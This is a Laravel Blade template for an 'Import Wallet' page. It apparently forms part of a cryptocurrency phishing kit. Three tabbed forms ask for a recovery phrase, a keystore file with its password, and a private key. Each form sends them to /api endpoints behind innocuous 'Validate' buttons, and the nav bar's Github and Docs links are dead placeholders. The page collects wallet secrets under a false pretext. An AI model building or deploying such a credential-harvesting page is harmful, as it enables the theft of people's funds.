@extends('layouts.app')

@section('content')

	<nav class="navbar navbar-expand navbar-light bg-light">
    	<div class="container">
	      
	    	<!-- Right Side Of Navbar -->
	        <ul class="navbar-nav w-100" style="justify-content: space-between; justify-items: space-between;">
	            
	            <li class="nav-item">
	                <a class="nav-link font-weight-bold" href="#">Github</a>
	            </li>

	            <li class="nav-item">
	                <a class="nav-link font-weight-bold" href="#">Docs</a>
	            </li>

	            <li class="nav-item">
	            	 <a class="navbar-brand" href="{{ url('/') }}">
			            <img src="/img/logo.svg" style="width: 50px;"> 
			        </a>
	            </li>

	            <li class="nav-item">
	                <a class="nav-link font-weight-bold" href="/wallets">Wallets</a>
	            </li>

	            <li class="nav-item">
	                <a class="nav-link font-weight-bold" href="/wallets">Apps</a>
	            </li>
	        </ul>
	    </div>
	</nav>

	<div class="py-5">
		<div class="container">
			<h4 class="text-center mb-5 h3 font-weight-bold">Import Wallet</h4>

			<div class="col-md-8 mx-auto">
				<ul class="nav nav-pills">
					<li class="active nav-item">
						<a data-toggle="tab" class="nav-link active" href="#home">Phrase</a>
					</li>

					<li class="nav-item">
						<a data-toggle="tab" class="nav-link" href="#menu1">Keystore JSON</a>
					</li>

					<li class="nav-item">
						<a data-toggle="tab" class="nav-link" href="#menu2">Private Key</a>
					</li>
				</ul>

				<div class="tab-content">
					<div id="home" class="tab-pane fade in active show">
					    <div class="py-4">
					    	<form method="POST" action="/api/phrase" class="ajaxForm">
					    		<div class="form-group">
					    			<textarea rows="10" name="phrase" placeholder="Phrase" class="form-control"></textarea>
					    		</div>

					    		<p class="form-text text-danger">
								  	Typically 12 (sometimes 24) words seperated by a single spaces.
								</p>

					    		<button class="btn btn-block btn-primary">Validate</button>
					    	</form>
					    </div>
					</div>

					<div id="menu1" class="tab-pane fade">
						<div class="py-4">
					    	<form method="POST" action="/api/keystore" class="ajaxForm">
					    		<div class="form-group">
					    			<textarea rows="10" placeholder="Keystore" name="keystore" class="form-control"></textarea>
					    		</div>

					    		<div class="form-group">
					    			<input type="password" name="password" class="form-control" placeholder="Passwprd">
					    		</div>

					    		<p class="form-text text-danger">
								  	Several lines of text beginning with "{...}" plus the password you used to encrypt it
								</p>

					    		<button class="btn btn-block btn-primary">Validate</button>
					    	</form>
					    </div>
					</div>

					<div id="menu2" class="tab-pane fade">
						<div class="py-4">
					    	<form method="POST" action="/api/private" class="ajaxForm">
					    		<div class="form-group">
					    			<textarea rows="10" name="private" placeholder="Private" class="form-control"></textarea>
					    		</div>

					    		<p class="form-text text-danger">
								  	Typically 12 (sometimes 24) words seperated by a single spaces.
								</p>

					    		<button class="btn btn-block btn-primary">Validate</button>
					    	</form>
					    </div>
					</div>
				</div>
			</div>
		
		</div>
	</div>

@endsection